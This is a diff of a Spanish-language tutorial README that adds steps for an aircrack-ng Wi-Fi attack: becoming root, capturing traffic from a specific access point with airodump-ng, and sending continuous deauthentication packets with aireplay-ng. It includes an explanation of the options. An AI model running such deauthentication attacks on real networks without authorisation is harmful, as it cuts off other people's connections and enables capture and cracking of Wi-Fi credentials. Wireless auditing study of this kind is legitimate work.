@@ -3,9 +3,20 @@
  ![comandos-aircrak](https://github.com/luisjuarez099/Une-Hacks/assets/83623972/fb6f860a-2491-41bf-9a56-fc8152d71266)
 
  
- 
- 
- 
+ ## Antes de emepezar se recomienda que creas una carpeta donde se van a guardar archivos que mas adelante vayamos a generar.
+
+> Nos convertimos en usuario root
+
+	sudo su
+
+> Creamos la carpeta
+
+ 	mkdir webAuth
+  
+> Nos movemos a la carpeta y desde ahi trabajamos
+
+	cd webAuth/
+
 ## Vemos cual es el nombre de nuestra interfaz de red
 
 	iwconfig
@@ -57,6 +68,17 @@ airodump-ng -c1 -w auditoria -d 50:4E:DC:38:C2:60  wlp0s20f3mon
 
 
 ## Hacemos el ataque
+
+#### Explicacion del comando
+### Explicacion del comando anterior.
+-   `aireplay-ng` se utiliza para enviar paquetes de desautenticación a una red inalámbrica, lo cual puede desconectar dispositivos específicos o todos los dispositivos de esa red.
+-   `--deauth [number of deauth packets]`: Especifica el número de paquetes de desautenticación a enviar. Usar `0` enviará paquetes de desautenticación de manera continua.
+-   `-c [target device MAC address]`: La dirección MAC del dispositivo que deseas desconectar.
+-   `-a [AP MAC address]`: La dirección MAC del punto de acceso (router).
+-   `[interface]`: La interfaz en modo monitor (por ejemplo, `wlan0mon`).
+
+> [!IMPORTANT]
+> Si no especificas `-c [target device MAC address]`, se intentará desconectar todos los dispositivos de la red.
 ```
 aireplay-ng --deauth 0 -a 50:4E:DC:38:C2:60 -c B2:11:8E:B5:DF:0D  wlp0s20f3mon
 ```
